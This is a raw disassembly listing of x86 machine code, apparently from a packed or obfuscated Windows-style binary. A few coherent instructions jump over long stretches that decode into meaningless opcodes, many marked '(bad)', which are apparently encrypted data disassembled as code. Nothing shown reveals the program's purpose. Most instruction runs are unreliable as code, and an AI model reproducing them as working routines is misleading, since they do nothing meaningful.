  4199fd:	mov    ecx,DWORD PTR ds:0x4282df
  419a03:	sbb    DWORD PTR ds:0x428267,ecx
  419a09:	adc    edx,DWORD PTR ds:0x42834b
  419a0f:	and    edx,0x987
  419a15:	adc    DWORD PTR ds:0x4282c7,0x29fb
  419a1f:	sbb    ecx,edx
  419a21:	xor    DWORD PTR ds:0x4282bf,edi
  419a27:	xor    DWORD PTR [esp+0x40],eax
  419a2b:	mov    ebx,DWORD PTR ds:0x4282d7
  419a31:	xor    DWORD PTR ds:0x4281eb,ebx
  419a37:	mov    DWORD PTR [esp+0x30],0x5b3d
  419a3f:	add    edx,0x5f01
  419a45:	mov    DWORD PTR [esp+0x34],0x4445
  419a4d:	sub    eax,DWORD PTR ds:0x4281ef
  419a53:	mov    DWORD PTR [esp+0x10],0xa52
  419a5b:	mov    DWORD PTR [esp+0x14],0x1c69
  419a63:	mov    eax,DWORD PTR [esp+0x10]
  419a67:	jmp    0x419e36
  419a6c:	xchg   DWORD PTR [edi-0x63e03bea],ebp
  419a72:	inc    edx
  419a73:	sub    bh,BYTE PTR [edx-0x128f7006]
  419a79:	aas    
  419a7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419a7b:	mov    esp,0x1816bbe3
  419a80:	mov    esp,0x30181812
  419a85:	leave  
  419a86:	push   edx
  419a87:	loope  0x419ad3
  419a89:	and    cl,cl
  419a8b:	loop   0x419a1c
  419a8d:	out    0x89,eax
  419a8f:	(bad)
  419a93:	mov    cl,0x4f
  419a95:	xchg   ebx,eax
  419a96:	lods   al,BYTE PTR ds:[esi]
  419a97:	enter  0x7965,0xca
  419a9b:	cmp    edi,esi
  419a9d:	mov    eax,ds:0xb67ac262
  419aa2:	retf   0x56ea
  419aa5:	in     eax,0xfd
  419aa7:	xchg   esp,eax
  419aa8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419aa9:	shl    DWORD PTR [esi+0x2e1e20ee],cl
  419aaf:	sub    cl,BYTE PTR [ebx+0x3cb067df]
  419ab5:	frstor [edi-0x13]
  419ab8:	mov    ds:0xa578e27d,al
  419abd:	pop    esp
  419abe:	add    edx,DWORD PTR ds:0x490604c7
  419ac4:	in     eax,0x8f
  419ac6:	cmp    DWORD PTR [ecx-0x264d0f32],esp
  419acc:	push   ss
  419acd:	mov    edi,DWORD PTR [eax-0xff16e5a]
  419ad3:	mov    esi,0xfcaf16d1
  419ad8:	pop    edi
  419ad9:	push   ds
  419ada:	in     al,dx
  419adb:	push   esp
  419adc:	shr    DWORD PTR [ecx],cl
  419ade:	lds    ebx,FWORD PTR [ebp-0x581c49ca]
  419ae4:	push   es
  419ae5:	loopne 0x419aae
  419ae7:	(bad)  
  419ae9:	push   ss
  419aea:	sbb    DWORD PTR [ecx],0xffffffe0
  419aed:	in     eax,0x7
  419aef:	xor    al,0x5a
  419af1:	pop    es
  419af2:	mov    ebx,0x6ab8b4f
  419af7:	fwait
  419af8:	(bad)  
  419af9:	and    DWORD PTR [esi+0x52],ebx
  419afc:	out    dx,al
  419afd:	pop    eax
  419afe:	stos   BYTE PTR es:[edi],al
  419aff:	mov    bh,0x3c
  419b01:	xlat   BYTE PTR ds:[ebx]
  419b02:	stc    
  419b03:	inc    edi
  419b04:	pop    ebx
  419b05:	bound  esp,QWORD PTR [edi+ebx*8+0x1f4f6dc5]
  419b0c:	popf   
  419b0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419b0e:	sbb    BYTE PTR ds:0x9704d4e0,bh
  419b14:	mov    ebp,0xde0d3e55
  419b19:	scas   eax,DWORD PTR es:[edi]
  419b1a:	mov    dl,BYTE PTR [esi]
  419b1c:	push   cs
  419b1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419b1e:	test   ebp,edi
  419b20:	(bad)  
  419b21:	xor    eax,0xfda2510c
  419b26:	mov    bh,0x30
  419b28:	retf   0xc810
  419b2b:	pop    eax
  419b2c:	sub    al,0xfb
  419b2e:	das    
  419b2f:	nop
  419b30:	jno    0x419ae6
  419b32:	int    0xd8
  419b34:	call   0x2e1f3f98
  419b39:	loop   0x419b58
  419b3b:	and    DWORD PTR [ebp-0x77],edi
  419b3e:	js     0x419b30
  419b40:	sar    DWORD PTR [ebx+0x142a309e],0xe9
  419b47:	fldcw  WORD PTR [esi-0x47]
  419b4a:	sbb    al,0x27
  419b4c:	push   ds
  419b4d:	out    dx,eax
  419b4e:	push   cs
  419b4f:	cmp    eax,0x39be57db
  419b54:	xchg   edi,eax
  419b55:	and    eax,esi
  419b57:	gs cmp eax,0xcb359c17
  419b5d:	int3   
  419b5e:	mov    bh,0xc6
  419b60:	ror    DWORD PTR [edx],cl
  419b62:	pop    es
  419b63:	mov    BYTE PTR [ebp+0x5b],dl
  419b66:	in     al,0x79
  419b68:	pushf  
  419b69:	dec    ecx
  419b6a:	dec    esi
  419b6b:	pop    edx
  419b6c:	lahf   
  419b6d:	test   BYTE PTR [esi+0x6d],al
  419b70:	push   eax
  419b71:	fcmovbe st,st(0)
  419b73:	add    ah,ah
  419b75:	mov    ds:0x9f77625e,eax
  419b7a:	out    0x55,eax
  419b7c:	bound  esp,QWORD PTR [ebp+0x78352488]
  419b82:	sti    
  419b83:	dec    ecx
  419b84:	jnp    0x419bca
  419b86:	stos   BYTE PTR es:[edi],al
  419b87:	aas    
  419b88:	xchg   edi,eax
  419b89:	inc    esp
  419b8a:	fmul   DWORD PTR [esi+0x6d]
  419b8d:	mov    al,0xa1
  419b8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b90:	push   ecx
  419b91:	shl    DWORD PTR [esi+0x2b873927],1
  419b97:	and    DWORD PTR [eax-0x18],esp
  419b9a:	outs   dx,DWORD PTR ds:[esi]
  419b9b:	cmp    bh,BYTE PTR [eax+0x62c7ece0]
  419ba1:	data16 sahf 
  419ba3:	and    BYTE PTR [ecx+0x5],dl
  419ba6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419ba7:	lds    edx,FWORD PTR [ebp-0x64]
  419baa:	imul   edi,DWORD PTR [esi+0x3b],0xffffffd7
  419bae:	sar    DWORD PTR [edi+0x10eee5c],0x1a
  419bb5:	sub    BYTE PTR [ebx+0x13cbffa6],0xe9
  419bbc:	add    DWORD PTR [edx-0x2859e97b],eax
  419bc2:	push   0xd9ea7273
  419bc7:	or     al,0x31
  419bc9:	sub    BYTE PTR [esi-0x43d74b99],al
  419bcf:	inc    edi
  419bd0:	fsubr  QWORD PTR [ecx+0x6fcd12e0]
  419bd6:	lock es aam 0xab
  419bda:	push   eax
  419bdb:	cs add eax,0x844ae9b9
  419be1:	adc    eax,0xe619618b
  419be6:	jbe    0x419bbd
  419be8:	and    eax,0x28bfdd03
  419bed:	lahf   
  419bee:	sbb    BYTE PTR [eax-0x50],cl
  419bf1:	jge    0x419c27
  419bf3:	mov    eax,ds:0xf468570d
  419bf8:	fcomp  QWORD PTR [esi+0x12]
  419bfb:	out    0x27,eax
  419bfd:	ja     0x419bdc
  419bff:	test   DWORD PTR [ecx-0x66966ba5],ebp
  419c05:	scas   al,BYTE PTR es:[edi]
  419c06:	adc    DWORD PTR [edi+eax*8+0x74],edx
  419c0a:	jecxz  0x419c84
  419c0c:	sbb    ebp,DWORD PTR [edx]
  419c0e:	add    al,0xcd
  419c10:	sub    dl,bl
  419c12:	xor    ah,dh
  419c14:	cs push ss
  419c16:	ja     0x419c3d
  419c18:	inc    edi
  419c19:	lods   al,BYTE PTR ds:[esi]
  419c1a:	push   ebp
  419c1b:	push   eax
  419c1c:	out    dx,eax
  419c1d:	addr16 loopne 0x419bfe
  419c20:	scas   al,BYTE PTR es:[edi]
  419c21:	cdq    
  419c22:	out    0x5b,eax
  419c24:	and    dh,ch
  419c26:	pop    ss
  419c27:	mov    WORD PTR [ecx+0x34aeba3c],cs
  419c2d:	aam    0x51
  419c2f:	push   cs
  419c30:	shl    BYTE PTR [edi+0x1c],cl
  419c33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419c34:	inc    edi
  419c35:	mov    ecx,0x44f2d108
  419c3a:	push   ss
  419c3b:	addr16 cdq 
  419c3d:	adc    eax,0x94c68a3
  419c42:	sub    eax,0xbbdc45bd
  419c47:	rcl    DWORD PTR ds:0x9da369ae,0x24
  419c4e:	xchg   ebx,eax
  419c4f:	push   ebp
  419c50:	sbb    cl,BYTE PTR [eax+ebp*4-0x2e]
  419c54:	inc    esi
  419c55:	outs   dx,BYTE PTR ds:[esi]
  419c56:	mov    eax,ds:0xc9b576e1
  419c5b:	in     al,0x31
  419c5d:	cmp    al,0x53
  419c5f:	push   edi
  419c60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419c61:	mov    dh,0x7b
  419c63:	pusha  
  419c64:	sub    al,0xf4
  419c66:	fsub   QWORD PTR [edi]
  419c68:	fdiv   st,st(7)
  419c6a:	cmp    ebx,DWORD PTR [edi-0x2f4d74fe]
  419c70:	shl    BYTE PTR [edi-0x20852a99],0x8a
  419c77:	daa    
  419c78:	ror    BYTE PTR [eax],cl
  419c7a:	jp     0x419c17
  419c7c:	pop    esp
  419c7d:	mov    ds:0x8df79710,eax
  419c82:	and    BYTE PTR [esi+eiz*1-0x2a02cbb4],bh
  419c89:	pop    eax
  419c8a:	es jmp 0xd29a36ef
  419c90:	inc    esi
  419c91:	dec    eax
  419c92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419c93:	out    0x91,eax
  419c95:	mov    eax,ds:0x735708ee
  419c9a:	pop    es
  419c9b:	lods   eax,DWORD PTR ds:[esi]
  419c9c:	jnp    0x419ca0
  419c9e:	push   esi
  419c9f:	inc    ebp
  419ca0:	not    BYTE PTR [esi]
  419ca2:	push   esp
  419ca3:	les    ecx,FWORD PTR [ecx]
  419ca5:	mov    esp,0xeb56a0b2
  419caa:	inc    edi
  419cab:	and    DWORD PTR [ebp+0x2f],0x37fb627e
  419cb2:	je     0x419c3a
  419cb4:	and    eax,0x63501019
  419cb9:	int3   
  419cba:	or     DWORD PTR [esp+ebx*4],edx
  419cbd:	cs std 
  419cbf:	mov    eax,ds:0xacc748f2
  419cc4:	dec    eax
  419cc5:	xchg   esp,eax
  419cc6:	sbb    al,0xc1
  419cc8:	fisttp QWORD PTR [ebp+0x6d986af1]
  419cce:	cwde   
  419ccf:	addr16 pop ds
  419cd1:	test   DWORD PTR [edx-0x78],0x63de8e96
  419cd8:	out    0xb4,eax
  419cda:	adc    BYTE PTR [edx-0x46a27569],0x14
  419ce1:	shl    BYTE PTR fs:[edx],cl
  419ce4:	mov    edi,edi
  419ce6:	js     0x419c74
  419ce8:	je     0x419d2c
  419cea:	push   es
  419ceb:	pop    ds
  419cec:	sub    bh,bl
  419cee:	and    eax,0x4d5f0c7
  419cf3:	jle    0x419d3d
  419cf5:	dec    ebp
  419cf6:	jne    0x419c94
  419cf8:	(bad)  
  419cf9:	enter  0xdc66,0x4
  419cfd:	fbstp  TBYTE PTR [ebx+0xdf87a93]
  419d03:	sub    ebp,DWORD PTR [ebx+ebx*8-0x63744ecd]
  419d0a:	imul   ebx,DWORD PTR [ebx-0xe4c23e9],0xffffffbe
  419d11:	fistp  DWORD PTR [ebp-0x1]
  419d14:	dec    ebx
  419d15:	stc    
  419d16:	xchg   esp,eax
  419d17:	mov    cs,WORD PTR [ebp+0x17]
  419d1a:	clc    
  419d1b:	pop    edx
  419d1c:	(bad)  
  419d1d:	sub    bl,BYTE PTR [ebx]
  419d1f:	and    BYTE PTR [edi],ah
  419d21:	push   es
  419d22:	mov    bh,cl
  419d24:	test   eax,0xe077b59a
  419d29:	test   DWORD PTR [edi-0x4974ad6d],0x3f9172f8
  419d33:	cmp    al,0xfd
  419d35:	sub    bl,BYTE PTR [esi-0x3a6c0f80]
  419d3b:	into   
  419d3c:	loop   0x419d5e
  419d3e:	imul   ebx,DWORD PTR es:[esi-0x35],0x62
  419d43:	jne    0x419d05
  419d45:	jb     0x419d6e
  419d47:	cmp    edx,DWORD PTR [ebx+0x7d]
  419d4a:	js     0x419cdd
  419d4c:	(bad)  
  419d4d:	mov    cl,dl
  419d4f:	and    dh,BYTE PTR [esi-0x2a819eca]
  419d55:	mov    dl,0xd0
  419d57:	cmp    DWORD PTR ds:0x58d92b18,ebp
  419d5d:	or     eax,0x1144191b
  419d62:	add    bh,bl
  419d64:	ja     0x419d1e
  419d66:	mov    es,WORD PTR [edi]
  419d68:	aas    
  419d69:	data16 jle 0x419dda
  419d6c:	cmp    al,0xd1
  419d6e:	shr    BYTE PTR [edx+0x23],1
  419d71:	(bad)  
  419d72:	hlt    
  419d73:	div    BYTE PTR [ebp+0x3733a808]
  419d79:	cmc    
  419d7a:	pop    edi
  419d7b:	or     ebp,DWORD PTR [edi-0x37]
  419d7e:	sub    DWORD PTR [eax],esi
  419d80:	(bad)  
  419d81:	fucomi st,st(7)
  419d83:	xchg   edi,eax
  419d84:	in     al,dx
  419d85:	add    al,0xcc
  419d87:	lods   eax,DWORD PTR ds:[esi]
  419d88:	outs   dx,DWORD PTR ds:[esi]
  419d89:	mov    BYTE PTR [esi-0x5e],bl
  419d8c:	loop   0x419d7a
  419d8e:	mul    DWORD PTR [ebx+edx*8+0x4b]
  419d92:	lock and dl,BYTE PTR [edi+0x56]
  419d96:	inc    esp
  419d97:	test   eax,0xb7e65acb
  419d9c:	icebp  
  419d9d:	xchg   esi,eax
  419d9e:	add    eax,0x3ae8961e
  419da3:	pop    ds
  419da4:	repnz xchg esi,eax
  419da6:	jecxz  0x419d88
  419da8:	ss in  eax,dx
  419daa:	jecxz  0x419dab
  419dac:	mov    dh,0xed
  419dae:	lock inc ecx
  419db0:	lahf   
  419db1:	mov    eax,ds:0xaf83816
  419db6:	adc    eax,0xb2aeb1e9
  419dbb:	push   ss
  419dbc:	stos   DWORD PTR es:[edi],eax
  419dbd:	push   ebx
  419dbe:	ror    DWORD PTR [eax],1
  419dc0:	mov    al,0xfa
  419dc2:	lds    edi,FWORD PTR [edx+ebp*8+0x6]
  419dc6:	(bad)  
  419dc7:	lds    esp,FWORD PTR [ebp+0x1e66b311]
  419dcd:	xor    eax,ebp
  419dcf:	repz dec ecx
  419dd1:	pop    esi
  419dd2:	retf   0x1ed4
  419dd5:	arpl   WORD PTR ds:0x704daf5c,si
  419ddb:	leave  
  419ddc:	aas    
  419ddd:	mov    cl,0x6a
  419ddf:	hlt    
  419de0:	push   0x41cf66ba
  419de5:	and    eax,0xaad5ea44
  419dea:	cmp    DWORD PTR [ebp+0x331d2500],ecx
  419df0:	push   0xe8b4dc99
  419df5:	pushf  
  419df6:	js     0x419e71
  419df8:	cli    
  419df9:	mov    edi,0x702b0762
  419dfe:	xchg   DWORD PTR [eax-0x4d692242],edx
  419e04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419e05:	add    DWORD PTR [ecx+0x1b],ecx
  419e08:	shl    DWORD PTR [esi+eiz*4-0x4d],cl
  419e0c:	jecxz  0x419e0e
  419e0e:	sar    dh,cl
  419e10:	(bad)  
  419e11:	pushf  
  419e12:	cmp    BYTE PTR [ecx+esi*4-0x71f594a2],ch
  419e19:	cdq    
  419e1a:	xor    al,0x73
  419e1c:	cwde   
  419e1d:	shr    edx,cl
  419e1f:	sbb    eax,DWORD PTR [eax+0x30]
  419e22:	fnsave [ebx]
  419e24:	pop    esi
  419e25:	imul   ebx,DWORD PTR [eax+0x1cef7344],0x8551832a
  419e2f:	dec    eax
  419e30:	sbb    esp,DWORD PTR [ecx]
  419e32:	xchg   ecx,eax
  419e33:	test   al,0x65
  419e35:	mov    WORD PTR [ebx-0x74ebdbb4],cs
  419e3b:	push   esp
  419e3c:	and    al,0x30
  419e3e:	mov    ebx,DWORD PTR [esp+0x34]
  419e42:	add    eax,0xffffd1a5
  419e47:	adc    ecx,0xffffedf0
  419e4d:	xor    eax,edx
  419e4f:	xor    ecx,ebx
  419e51:	jmp    0x41a220
  419e56:	pop    eax
  419e58:	es push esp
  419e5a:	sub    bl,BYTE PTR es:[ebx-0x46]
  419e5e:	pusha  
  419e5f:	in     eax,0xd3
  419e61:	mov    esp,0xbca371b8
  419e66:	xchg   BYTE PTR [ebp+0x12bc1816],dh
  419e6c:	sbb    BYTE PTR [eax],bl
  419e6e:	inc    ecx
  419e6f:	add    BYTE PTR [edx-0x1f],0xcc
  419e73:	pop    esp
  419e74:	mov    dl,0x44
  419e76:	call   0x9213:0x279d388f
  419e7d:	sub    ebp,DWORD PTR [ebp-0x44]
  419e80:	mov    ebx,0x241e9863
  419e85:	and    al,0x40
  419e87:	outs   dx,DWORD PTR ds:[esi]
  419e88:	cmp    eax,0xfa85b42
  419e8d:	push   0x28ad6837
  419e92:	jle    0x419e61
  419e94:	or     al,0xab
  419e96:	inc    ebp
  419e97:	bnd jg 0x419ef3
  419e9a:	add    al,0xed
  419e9c:	pop    ebx
  419e9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e9e:	push   ss
  419e9f:	mov    ebp,0x54035c37
  419ea4:	adc    ebp,DWORD PTR [ecx-0x1f6bb9f3]
  419eaa:	mov    cl,cl
  419eac:	or     edx,DWORD PTR [esi]
  419eae:	pushf  
  419eaf:	add    eax,0x917c2d0f
  419eb4:	xor    ebp,DWORD PTR [esi-0x24]
  419eb7:	(bad)  
  419eb9:	cmp    ch,BYTE PTR gs:[ecx+eax*2-0x45002527]
  419ec1:	fmul   QWORD PTR [eax-0x5a]
  419ec4:	mov    dh,0xd7
  419ec6:	mov    dl,0x7c
  419ec8:	js     0x419eed
  419eca:	addr16 adc dh,dl
  419ecd:	mov    eax,0x3a422460
  419ed2:	fstp   DWORD PTR [edx+0x2a]
  419ed5:	scas   al,BYTE PTR es:[edi]
  419ed6:	or     DWORD PTR [ebx-0x365aacc],edi
  419edc:	xor    edi,DWORD PTR [ebx+0xc]
  419edf:	adc    al,0xec
  419ee1:	xchg   ebx,eax
  419ee2:	jecxz  0x419ef5
  419ee4:	jmp    0x419f00
  419ee6:	pop    edi
  419ee7:	adc    eax,DWORD PTR [ebp-0x5e85e3a]
  419eed:	ficom  WORD PTR [ebx]
  419eef:	(bad)  
  419ef0:	lods   al,BYTE PTR ds:[esi]
  419ef1:	jb     0x419f30
  419ef3:	and    DWORD PTR [esi+0x1e],0xc7fc2dce
  419efa:	push   0x7809e02f
  419eff:	and    eax,0xe300fc3c
  419f04:	jge    0x419f63
  419f06:	(bad)  
  419f07:	in     al,dx
  419f08:	dec    ebp
  419f09:	in     eax,dx
  419f0a:	sti    
  419f0b:	daa    
  419f0c:	jp     0x419ea9
  419f0e:	sbb    ebx,edi
  419f10:	dec    edx
  419f11:	xor    al,0xff
  419f13:	fnstcw WORD PTR [esi-0x26e88e3b]
  419f19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419f1a:	xchg   edx,edi
  419f1c:	mov    eax,ds:0xab0069dc
  419f21:	out    0x7f,al
  419f23:	repz dec esp
  419f25:	lods   al,BYTE PTR ds:[esi]
  419f26:	js     0x419f32
  419f28:	sbb    eax,0xec2a10cb
  419f2d:	sub    esi,esp
  419f2f:	addr16 jg 0x419f71
  419f32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419f33:	adc    edi,DWORD PTR [esi+esi*2+0x2d]
  419f37:	pop    esp
  419f38:	ja     0x419edc
  419f3a:	imul   edi,DWORD PTR [edx+0x30],0x70ad3d5e
  419f41:	xchg   edi,edi
  419f43:	add    al,0x7b
  419f45:	enter  0x50c3,0x64
  419f49:	cmp    eax,0xe8dc4c5b
  419f4e:	push   ecx
  419f4f:	push   0xffffffb9
  419f51:	jmp    0x3265c86
  419f56:	arpl   ax,bx
  419f58:	cmp    al,0x3a
  419f5a:	retf   0xbf35
  419f5d:	fsubr  QWORD PTR [ecx-0x5513f67d]
  419f63:	push   es
  419f64:	mov    ah,0xb4
  419f66:	or     esp,DWORD PTR [ecx+0x6c]
  419f69:	inc    edx
  419f6a:	pop    esp
  419f6b:	mov    esp,0x624e4470
  419f70:	and    eax,DWORD PTR [eax]
  419f72:	cmp    al,0x9e
  419f74:	xchg   ebx,eax
  419f75:	cmp    eax,0xe11f1d17
  419f7a:	pop    edx
  419f7b:	mov    ch,0x7c
  419f7d:	cmc    
  419f7e:	add    dl,BYTE PTR [esi-0x5c]
  419f81:	dec    esp
  419f82:	mov    eax,0xcac6dd7b
  419f87:	mov    al,0xde
  419f89:	jg     0x419f61
  419f8b:	daa    
  419f8c:	and    dl,bh
  419f8e:	(bad)  
  419f8f:	or     cl,BYTE PTR [edi-0x65cdac21]
  419f95:	out    dx,eax
  419f96:	popa   
  419f97:	sti    
  419f98:	mov    esp,0x1f26e322
  419f9d:	pusha  
  419f9e:	adc    DWORD PTR [ecx],ebx
  419fa0:	call   0xf88f:0xd646fcae
  419fa7:	ins    BYTE PTR es:[edi],dx
  419fa8:	xchg   BYTE PTR [edx],dl
  419faa:	fldcw  WORD PTR [edi+0x1874a924]
  419fb0:	cld    
  419fb1:	int    0x98
  419fb3:	inc    esi
  419fb4:	popf   
  419fb5:	push   es
  419fb6:	push   es
  419fb7:	push   0xdd6e0c4a
  419fbc:	test   BYTE PTR [edx+ecx*4-0x13231637],dl
  419fc3:	cmp    DWORD PTR [ebp+esi*1+0xd1a68c3],esi
  419fca:	sub    esi,edx
  419fcc:	pop    es
  419fcd:	jle    0x419f61
  419fcf:	ret    
  419fd0:	int3   
  419fd1:	sub    eax,0x691f8aec
  419fd6:	daa    
  419fd7:	sahf   
  419fd8:	stc    
  419fd9:	jp     0x41a04d
  419fdb:	fldcw  WORD PTR [edx+0x1f]
  419fde:	adc    eax,0xb0fd85b5
  419fe3:	dec    eax
  419fe4:	sbb    eax,0x80f209d5
  419fe9:	loop   0x419fe0
  419feb:	mov    ds:0xc7d50d11,al
  419ff0:	ins    DWORD PTR es:[edi],dx
  419ff1:	in     eax,0x4f
  419ff3:	mov    edx,0xc9ff8fb2
  419ff8:	adc    al,0xa6
  419ffa:	ds inc edx
  419ffc:	mov    dl,0x1b
  419ffe:	push   cs
  419fff:	fs pushf 
  41a001:	mov    ds:0x4c920413,eax
  41a006:	outs   dx,BYTE PTR ds:[esi]
  41a007:	fild   QWORD PTR [ebp+0x7ca6cba9]
  41a00d:	and    dl,BYTE PTR [ecx+0x6b0fa94a]
  41a013:	into   
  41a014:	fisttp DWORD PTR [eax-0x73ee6aad]
  41a01a:	cmp    BYTE PTR [eax+0x10a155fd],bl
  41a020:	std    
  41a021:	js     0x419ffb
  41a023:	mov    eax,ds:0xd0b56109
  41a028:	shl    DWORD PTR [edx],0x8a
  41a02b:	leave  
  41a02c:	rcl    DWORD PTR [edx+0x18963937],cl
  41a032:	xchg   esp,eax
  41a033:	add    DWORD PTR [eax+eax*1],ecx
  41a036:	inc    esi
  41a037:	mov    ecx,0x5c5845e
  41a03c:	std    
  41a03d:	nop
  41a03e:	into   
  41a03f:	popa   
  41a040:	mov    ah,0xdf
  41a042:	test   eax,esp
  41a044:	xor    dh,0xed
  41a047:	ins    DWORD PTR es:[edi],dx
  41a048:	dec    esp
  41a049:	stos   BYTE PTR es:[edi],al
  41a04a:	jmp    0x6712:0x97cb01a0
  41a051:	loope  0x41a07d
  41a053:	mov    edx,0xd3a60ac9
  41a058:	cdq    
  41a059:	nop
  41a05a:	mov    cl,0x81
  41a05c:	dec    eax
  41a05d:	out    0x44,eax
  41a05f:	mov    edx,0xa502267f
  41a064:	test   esp,0x47024ce4
  41a06a:	aad    0x8b
  41a06c:	ss push ss
  41a06e:	fdiv   DWORD PTR [esi+0x68]
  41a071:	fs sbb ebx,0x7e
  41a075:	sar    DWORD PTR [edi+0x264b580a],1
  41a07b:	xor    eax,0x149f577
  41a080:	or     BYTE PTR [ebx],cl
  41a082:	das    
  41a083:	fist   WORD PTR [eax+0x1892bae]
  41a089:	(bad)  [esi-0x24]
  41a08c:	sahf   
  41a08d:	xor    BYTE PTR [esi+0x36d7ac10],ch
  41a093:	push   ds
  41a094:	dec    ebx
  41a095:	pop    ebp
  41a096:	add    bl,BYTE PTR [esi-0x6c4c3714]
  41a09c:	retf   
  41a09d:	dec    esi
  41a09e:	mov    bh,BYTE PTR [ecx]
  41a0a0:	pop    esp
  41a0a1:	mov    ecx,0x33a92f61
  41a0a6:	cmp    ebx,eax
  41a0a8:	test   BYTE PTR [edx-0x14192d2],ah
  41a0ae:	mov    ah,0xb1
  41a0b0:	repnz int3 
  41a0b2:	div    BYTE PTR [esi]
  41a0b4:	shl    BYTE PTR [edx-0x5652883c],1
  41a0ba:	or     BYTE PTR [ecx+0x2c8c5011],bh
  41a0c0:	push   cs
  41a0c1:	sub    ebx,edx
  41a0c3:	enter  0x5bae,0xa2
  41a0c7:	pop    ss
  41a0c8:	(bad)  
  41a0c9:	or     edi,DWORD PTR [eax-0x35]
  41a0cc:	ror    BYTE PTR [ecx],1
  41a0ce:	outs   dx,BYTE PTR ds:[esi]
  41a0cf:	ret    0xf6a0
  41a0d2:	pop    esi
  41a0d3:	xor    al,0x4b
  41a0d5:	and    eax,0xf8dc3f9d
  41a0da:	adc    ebp,DWORD PTR [edi]
  41a0dc:	or     esi,DWORD PTR [esi+0x350384d2]
  41a0e2:	and    DWORD PTR [esi+0x1f],eax
  41a0e5:	adc    DWORD PTR [ebx],esp
  41a0e7:	mov    al,0x5e
  41a0e9:	call   0x3a72:0xe4493ea0
  41a0f0:	(bad)  
  41a0f1:	rol    dl,0x89
  41a0f4:	out    0xfd,eax
  41a0f6:	cmc    
  41a0f7:	and    al,0xdb
  41a0f9:	adc    edx,DWORD PTR [esi+edi*1+0x33]
  41a0fd:	test   DWORD PTR [edx-0x39],esp
  41a100:	leave  
  41a101:	mov    edi,0x21355330
  41a106:	mov    dl,0x80
  41a108:	mov    dl,0xaa
  41a10a:	xchg   ebp,eax
  41a10b:	fwait
  41a10c:	fs dec edi
  41a10e:	cmp    edx,DWORD PTR [ebx+eiz*4+0x25]
  41a112:	dec    edi
  41a113:	push   esi
  41a114:	out    0x69,eax
  41a116:	shl    edx,1
  41a118:	xor    al,0x55
  41a11a:	lock xor eax,0x7076a6b6
  41a120:	iret   
  41a121:	(bad)  [ebp-0x62]
  41a124:	push   ebp
  41a125:	push   esp
  41a126:	add    cl,bl
  41a128:	imul   DWORD PTR [esp+ebx*1]
  41a12b:	xor    al,BYTE PTR [eax-0x18]
  41a12e:	dec    eax
  41a12f:	push   cs
  41a130:	sbb    eax,0xda4dfc59
  41a135:	jmp    0x41a135
  41a137:	cld    
  41a138:	mov    ds:0xaaa0d30,al
  41a13d:	jnp    0x41a18f
  41a13f:	add    eax,0xea2d69d5
  41a144:	add    cl,cl
  41a146:	inc    edx
  41a147:	jp     0x41a124
  41a149:	and    al,0xc1
  41a14b:	test   BYTE PTR [ebx+edx*1+0x2f],cl
  41a14f:	(bad)  
  41a150:	test   al,0xf6
  41a152:	xchg   ecx,eax
  41a153:	mov    BYTE PTR [eax],bl
  41a155:	out    0x67,al
  41a157:	push   0x11
  41a159:	pop    di
  41a15b:	test   ebx,edx
  41a15d:	ret    
  41a15e:	repnz push cs
  41a160:	add    ebp,eax
  41a162:	jnp    0x41a139
  41a164:	out    0xa2,eax
  41a166:	cmp    edx,DWORD PTR [esi+0xa07b783]
  41a16c:	mov    al,0x68
  41a16e:	push   cs
  41a16f:	cli    
  41a170:	inc    esi
  41a171:	mov    ds:0x1b2c1602,al
  41a176:	jmp    0xe6abcc02
  41a17b:	or     al,0xb7
  41a17d:	jo     0x41a10b
  41a17f:	xlat   BYTE PTR ds:[ebx]
  41a180:	int3   
  41a181:	lea    edx,[eax+0x18907a98]
  41a187:	leave  
  41a188:	pop    es
  41a189:	cdq    
  41a18a:	fcmovb st,st(3)
  41a18c:	int3   
  41a18d:	cmp    eax,0x861dc49a
  41a192:	pop    es
  41a193:	mov    edx,DWORD PTR [edx]
  41a195:	mov    ah,0x6b
  41a197:	xor    ebp,DWORD PTR [esi+esi*4+0x64d24dcf]
  41a19e:	adc    esi,DWORD PTR [edx]
  41a1a0:	in     al,dx
  41a1a1:	les    edx,FWORD PTR ds:0x43ccdf80
  41a1a7:	pop    esi
  41a1a8:	or     edi,DWORD PTR [edi]
  41a1aa:	aaa    
  41a1ab:	mov    bl,0xa4
  41a1ad:	in     al,dx
  41a1ae:	mov    bl,0xde
  41a1b0:	in     eax,0x94
  41a1b2:	pop    esi
  41a1b3:	cmp    bl,BYTE PTR [edi]
  41a1b5:	es push ebx
  41a1b7:	out    dx,eax
  41a1b8:	subps  xmm7,XMMWORD PTR [ebx]
  41a1bb:	sub    ebp,ebp
  41a1bd:	mov    esp,0x9257d66d
  41a1c2:	retf   
  41a1c3:	sbb    eax,0x76c7d4ef
  41a1c8:	sub    dh,BYTE PTR [edx]
  41a1ca:	je     0x41a1d3
  41a1cc:	or     DWORD PTR [ebx+ebp*1+0x19],ecx
  41a1d0:	xor    DWORD PTR [esi-0x6a],ecx
  41a1d3:	lock ins BYTE PTR es:[edi],dx
  41a1d5:	in     al,0xf4
  41a1d7:	inc    esp
  41a1d8:	sub    BYTE PTR [esi-0x8],0x0
  41a1dc:	push   edi
  41a1dd:	jb     0x41a201
  41a1df:	push   eax
  41a1e0:	jae    0x41a22c
  41a1e2:	dec    ebx
  41a1e3:	sub    al,0xb1
  41a1e5:	jae    0x41a1c0
  41a1e7:	hlt    
  41a1e8:	sbb    al,0x3d
  41a1ea:	xor    DWORD PTR [edi],esp
  41a1ec:	repz pop ebp
  41a1ee:	adc    BYTE PTR [ecx-0x35],bl
  41a1f1:	lahf   
  41a1f2:	and    esp,edx
  41a1f4:	dec    esp
  41a1f5:	jns    0x41a1e8
